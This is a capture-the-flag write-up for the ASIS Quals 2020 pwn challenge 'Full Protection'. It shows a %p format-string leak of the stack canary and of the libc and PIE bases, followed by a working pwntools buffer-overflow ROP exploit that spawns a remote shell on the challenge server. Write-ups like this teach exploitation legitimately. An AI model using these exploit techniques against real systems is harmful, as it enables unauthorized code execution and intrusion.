# ASIS CTF Quals 2020

## Full Protection

> 53
> 
> Fully [protected](full_protection_distfiles_2fad32e887e961776f9b1ab9f767d004e551cf48.txz)!
>
> `nc 69.172.229.147 9002`

Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _bof_ _stack-canary_ _fortify_ _format-string_


## Summary

Canary leak to enable BOF, ROP, Shell.  FORTIFied.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

Default `gcc` mitigations in place + FORTIFY.

    
### Decompile with Ghidra

```c
  while( true ) {
    iVar1 = readline((char *)&local_58,0x40);
    if (iVar1 == 0) break;
    __printf_chk(1,&local_58);
    _IO_putc(10,stdout);
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
```

This looks a little different from your average format string exploit, e.g. `__printf_chk`:


> ### `__printf_chk`
>
> #### Name
>
> `__printf_chk` -- format and print data, with stack checking
> 
> #### Description
> 
> The interface `__printf_chk()` shall function in the same way as the interface `printf()`, except that `__printf_chk()` shall check for stack overflow before computing a result, depending on the value of the flag parameter. If an overflow is anticipated, the function shall abort and the program calling it shall exit.
>
> _Source: [https://refspecs.linuxbase.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/libc---printf-chk-1.html](https://refspecs.linuxbase.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/libc---printf-chk-1.html)_

To see what this does:

```
# ./chall
%p
0x7fffbb710290
%2$p
*** invalid %N$ use detected ***
Aborted

# ./chall
%n
*** %n in writable segment detected ***
Aborted
```

Bad news, classic format string exploits are off the table.  The good news is `%p` is not completely shut off:

```
# ./chall
%p %p %p
0x7ffc19b80330 0x10 0x7fb94d5a68c0
```

With the following we can leak all there is to leak:

```python
from pwn import *

binary = ELF('./chall')
libc = ELF('./libc-2.27.so')
context.update(arch='amd64',os='linux')
p = process(binary.path)

p.sendline((0x40//2 - 1) * '%p')
_ = p.recvline().strip().replace(b'(nil)',b'0x0').replace(b'0x',b' 0x').split()

for i in range(len(_)):
    print(i,_[i])
```

Output:

```
0 b'0x7fff9c24a9d0'
1 b'0x10'
2 b'0x7ffb19d178c0'
3 b'0x7ffb19f20500'
4 b'0x7025702570257025'
5 b'0x7025702570257025'
6 b'0x7025702570257025'
7 b'0x7025702570257025'
8 b'0x7025702570257025'
9 b'0x7025702570257025'
10 b'0x7025702570257025'
11 b'0x702570257025'
12 b'0x7fff9c24ab00'
13 b'0x4c49f238e3aba400'
14 b'0x0'
15 b'0x7ffb1994bb97'
16 b'0x1'
17 b'0x7fff9c24ab08'
18 b'0x100008000'
19 b'0x5594e1e9f850'
20 b'0x0'
21 b'0x5ff1227246fd1a55'
22 b'0x5594e1e9f920'
23 b'0x7fff9c24ab00'
24 b'0x0'
25 b'0x0'
26 b'0xb27d9e8e67d1a55'
27 b'0xb2ed288c4831a55'
28 b'0x7fff00000000'
29 b'0x0'
30 b'0x0'
```

> This works remotely as well.

Offset `13` looks like a canary; we'll need GDB to help figure out the rest:

```
0x00007fffffffe538│+0x0048: 0xb430df0a96bac500
0x00007fffffffe540│+0x0050: 0x0000000000000000
0x00007fffffffe548│+0x0058: 0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax
0x00007fffffffe550│+0x0060: 0x0000000000000001
0x00007fffffffe558│+0x0068: 0x00007fffffffe628  →  0x00007fffffffe824  →  "/pwd/datajerk/asisquals2020/full_protection/chall"
0x00007fffffffe560│+0x0070: 0x0000000100008000
0x00007fffffffe568│+0x0078: 0x0000555555554850  →  <main+0> pxor xmm0, xmm0
```

From the canary down, libc can be had from offset 15 (13+2), and `main` from offset 19 (13+6).

## Exploit

```python
#!/usr/bin/python3

from pwn import *

binary = ELF('./chall')
libc = ELF('./libc-2.27.so')
context.update(arch='amd64',os='linux')

#p = process(binary.path)
p = remote('69.172.229.147', 9002)

```

Initial setup.


```python
p.sendline((0x40//2 - 1) * '%p')
_ = p.recvline().strip().replace(b'(nil)',b'0x0').replace(b'0x',b' 0x').split()

canary = int(_[13],16)
log.info('canary: ' + hex(canary))
baselibc = int(_[15],16) - libc.symbols['__libc_start_main'] - 231
libc.address = baselibc
log.info('baselibc: ' + hex(baselibc))
baseproc = int(_[19],16) - binary.symbols['main']
binary.address = baseproc
log.info('baseproc: ' + hex(baseproc))
```

First pass.  Leak as much of the stack as possible and find the canary, libc, and `main`.


```python
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = (0x58 - 0x10) * b'\x00'
payload += p64(canary)
payload += p64(0x0)
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.symbols['system'])

p.sendline(payload)

p.interactive()
```

BOF with nulls, then exploit.  The first null is important so that `readline` will return a length of zero and exit the loop executing our exploit.

Output:

```
# ./exploit.py
[*] '/pwd/datajerk/asisquals2020/full_protection/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[*] '/pwd/datajerk/asisquals2020/full_protection/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 69.172.229.147 on port 9002: Done
[*] canary: 0xa2bea80616728e00
[*] baselibc: 0x7f4acc5a8000
[*] baseproc: 0x56459cae4000
[*] Loaded 19 cached gadgets for './chall'
[*] Switching to interactive mode
$ cat flag.txt
ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}
```